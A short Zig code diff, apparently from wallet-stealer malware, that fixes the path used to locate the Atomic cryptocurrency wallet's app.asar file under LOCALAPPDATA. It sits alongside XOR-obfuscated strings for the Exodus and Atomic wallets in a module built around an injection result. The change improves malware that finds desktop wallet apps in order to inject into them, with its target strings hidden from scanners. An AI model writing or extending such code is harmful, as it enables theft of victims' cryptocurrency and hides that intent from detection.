@@ -9,6 +9,7 @@ pub const InjectionResult = struct {
 const E = struct {
     pub const exodus_pattern = hash.xorEncrypt("Exodus");
     pub const atomic_pattern = hash.xorEncrypt("atomic");
+    pub const programs_dir = hash.xorEncrypt("Programs");
     pub const local_app_data = hash.xorEncrypt("LOCALAPPDATA");
     pub const exodus_asar = hash.xorEncrypt("app.asar");
     pub const resources = hash.xorEncrypt("resources");
@@ -60,12 +61,14 @@ fn findExodusWallet(allocator: std.mem.Allocator, local: []const u8) bool {
 fn findAtomicWallet(allocator: std.mem.Allocator, local: []const u8) bool {
     var atomic_buf: [E.atomic_pattern.len]u8 = undefined;
     hash.xorDecrypt(&E.atomic_pattern, &atomic_buf);
+    var programs_buf: [E.programs_dir.len]u8 = undefined;
+    hash.xorDecrypt(&E.programs_dir, &programs_buf);
     var resources_buf: [E.resources.len]u8 = undefined;
     hash.xorDecrypt(&E.resources, &resources_buf);
     var asar_buf: [E.exodus_asar.len]u8 = undefined;
     hash.xorDecrypt(&E.exodus_asar, &asar_buf);
 
-    const full = std.fs.path.join(allocator, &[_][]const u8{ local, &atomic_buf, &resources_buf, &asar_buf }) catch return false;
+    const full = std.fs.path.join(allocator, &[_][]const u8{ local, &programs_buf, &atomic_buf, &resources_buf, &asar_buf }) catch return false;
     defer allocator.free(full);
 
     var file = std.fs.openFileAbsolute(full, .{}) catch return false;
